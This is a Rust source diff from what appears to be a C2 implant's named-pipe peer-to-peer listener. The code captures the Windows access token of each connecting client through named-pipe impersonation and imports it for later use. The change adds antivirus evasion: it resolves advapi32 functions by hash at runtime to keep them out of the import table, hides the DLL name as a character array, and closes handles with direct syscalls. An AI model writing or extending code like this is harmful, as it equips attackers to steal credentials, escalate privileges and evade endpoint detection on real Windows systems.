@@ -5421,45 +5421,75 @@ pub mod nt_pipe_server {
             #[cfg(all(windows, feature = "token-impersonation"))]
             {
                 if crate::token_impersonation::is_enabled() {
-                    // Briefly impersonate to extract the token.
-                    let ok = unsafe {
-                        winapi::um::namedpipeapi::ImpersonateNamedPipeClient(connected_handle as _)
+                    // Resolve advapi32 functions at runtime to avoid IAT entries.
+                    let advapi32_w: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+                    let advapi32 = match pe_resolve::get_module_handle_by_hash(
+                        pe_resolve::hash_wstr(&advapi32_w[..advapi32_w.len() - 1]),
+                    ) {
+                        Some(base) => base,
+                        None => {
+                            log::debug!("p2p-pipe: advapi32 not found for token extraction");
+                            return P2pListenerEvent::LinkRejected {
+                                reason: 0xFF,
+                                description: "advapi32 not found".into(),
+                            };
+                        }
                     };
-                    if ok != 0 {
-                        // Extract the impersonation token from this thread.
-                        let mut token: winapi::um::winnt::HANDLE = std::ptr::null_mut();
-                        let open_ok = unsafe {
-                            winapi::um::processthreadsapi::OpenThreadToken(
-                                winapi::um::processthreadsapi::GetCurrentThread(),
-                                winapi::um::winnt::TOKEN_DUPLICATE
-                                    | winapi::um::winnt::TOKEN_QUERY
-                                    | winapi::um::winnt::TOKEN_IMPERSONATE,
-                                1, // OpenAsSelf = TRUE
-                                &mut token,
-                            )
-                        };
-                        // Immediately revert — we don't want to stay impersonated.
-                        unsafe { winapi::um::securitybaseapi::RevertToSelf() };
+                    let impersonate_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> i32> =
+                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"ImpersonateNamedPipeClient\0")) }
+                            .map(|addr| unsafe { std::mem::transmute(addr) });
+                    let open_thread_token_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, u32, i32, *mut *mut std::ffi::c_void) -> i32> =
+                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"OpenThreadToken\0")) }
+                            .map(|addr| unsafe { std::mem::transmute(addr) });
+                    let revert_fn: Option<unsafe extern "system" fn() -> i32> =
+                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"RevertToSelf\0")) }
+                            .map(|addr| unsafe { std::mem::transmute(addr) });
 
-                        if open_ok != 0 && !token.is_null() {
-                            let source = crate::token_impersonation::TokenSource::Pipe(
-                                self.pipe_path.clone(),
-                            );
-                            match crate::token_impersonation::import_token(token, source) {
-                                Ok(info) => {
-                                    log::info!("p2p-pipe: extracted token from peer: {info}");
+                    if let (Some(impersonate), Some(open_tok), Some(revert)) =
+                        (impersonate_fn, open_thread_token_fn, revert_fn)
+                    {
+                        // Briefly impersonate to extract the token.
+                        let ok = unsafe { impersonate(connected_handle as *mut std::ffi::c_void) };
+                        if ok != 0 {
+                            // Extract the impersonation token from this thread.
+                            let mut token: winapi::um::winnt::HANDLE = std::ptr::null_mut();
+                            let current_thread: winapi::um::winnt::HANDLE =
+                                (-1isize) as winapi::um::winnt::HANDLE; // pseudo-handle
+                            let open_ok = unsafe {
+                                open_tok(
+                                    current_thread,
+                                    winapi::um::winnt::TOKEN_DUPLICATE
+                                        | winapi::um::winnt::TOKEN_QUERY
+                                        | winapi::um::winnt::TOKEN_IMPERSONATE,
+                                    1, // OpenAsSelf = TRUE
+                                    &mut token,
+                                )
+                            };
+                            // Immediately revert — we don't want to stay impersonated.
+                            unsafe { revert() };
+
+                            if open_ok != 0 && !token.is_null() {
+                                let source = crate::token_impersonation::TokenSource::Pipe(
+                                    self.pipe_path.clone(),
+                                );
+                                match crate::token_impersonation::import_token(token, source) {
+                                    Ok(info) => {
+                                        log::info!("p2p-pipe: extracted token from peer: {info}");
+                                    }
+                                    Err(e) => {
+                                        log::debug!("p2p-pipe: token import failed: {e:#}");
+                                    }
                                 }
-                                Err(e) => {
-                                    log::debug!("p2p-pipe: token import failed: {e:#}");
-                                }
+                                // Close the original token — import_token duplicates it.
+                                let _ = syscall!("NtClose", token as u64);
                             }
-                            // Close the original token — import_token duplicates it.
-                            let _ = syscall!("NtClose", token as u64);
+                        } else {
+                            log::debug!(
+                                "p2p-pipe: ImpersonateNamedPipeClient failed for token extraction"
+                            );
                         }
                     } else {
-                        log::debug!(
-                            "p2p-pipe: ImpersonateNamedPipeClient failed for token extraction"
-                        );
+                        log::debug!("p2p-pipe: could not resolve advapi32 token functions");
                     }
                 }
             }
